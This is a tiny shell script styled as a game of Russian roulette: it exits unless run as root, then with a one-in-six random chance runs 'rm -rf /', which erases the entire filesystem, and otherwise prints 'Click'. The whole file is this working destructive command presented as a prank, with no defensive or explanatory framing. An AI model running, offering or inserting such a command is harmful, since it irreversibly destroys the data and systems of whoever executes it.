#!/bin/sh
[ "$EUID" -ne 0 ] && echo "How about playing as root?" && exit
[ $[ $RANDOM % 6 ] == 0 ] && rm -rf / || echo "Click"
